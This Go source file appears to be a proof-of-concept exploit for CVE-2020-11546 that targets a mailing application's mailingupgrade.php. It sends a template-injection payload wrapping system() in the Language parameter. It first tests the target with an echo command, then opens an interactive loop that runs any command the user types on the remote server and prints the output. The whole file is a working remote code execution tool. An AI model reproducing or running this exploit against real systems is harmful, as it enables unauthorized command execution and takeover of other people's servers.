package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func banner(){
	fmt.Println(`
    .___ _____         ____  __          
  __| _//  |  |  _____/_   |/  |_  ______
 / __ |/   |  |_/     \|   \   __\/  ___/
/ /_/ /    ^   /  Y Y  \   ||  |  \___ \ 
\____ \____   ||__|_|  /___||__| /____  >
     \/    |__|      \/               \/

		CVE-2020-11546
`)
}

/* *
参数检查
 */
func argsCheck(args []string) {

	if len(args) != 2 {
		fmt.Printf("Usage:\n\t./%s <target>\n", args[0])
		os.Exit(0)
	}
}

/* *
url处理
 */
func urlHandler(target string) string {
	// 没有http前缀的添加http前缀
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}
	// 有/结尾的就去掉/
	if strings.HasSuffix(target, "/") {	// 去掉后缀 /
		target = strings.TrimSuffix(target, "/")
		fmt.Println(target)
	}

	return target
}

/* *
漏洞检查
 */
func check(target string) bool {
	// 创建请求
	vulurl := target + "/mailingupgrade.php"
	req, _ := http.NewRequest("POST", vulurl, bytes.NewReader([]byte(`step=4&Language=de%7b$%7bsystem(%22echo vultest%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E`)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	// 发起请求
	client := http.Client{}
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "vultest") {
		return true
	}
	return false
}

/* *
漏洞检查
*/
func exp(target string, command string) {
	// 创建请求
	vulurl := target + "/mailingupgrade.php"
	data := `step=4&Language=de%7b$%7bsystem(%22` + command + `%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E`
	req, _ := http.NewRequest("POST", vulurl, bytes.NewReader([]byte(data)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	// 发起请求
	client := http.Client{}
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	res := strings.Replace(string(body), "Can't load correct language file in /language directory", "", -1)
	res = strings.TrimSpace(res)
	fmt.Println(res)
}

func main() {
	args := os.Args
	banner()
	argsCheck(args)
	target := args[1]
	target = urlHandler(target)
	if check(target) {
		fmt.Printf("target %s is vuln", target)
		var command string
		for {
			for {
				fmt.Printf("\n\ncommand: ")
				fmt.Scanln(&command)
				if command != "" {
					break
				}
			}
			exp(target, command)
		}
	} else {
		fmt.Printf("target %s is not vuln", target)
	}
}
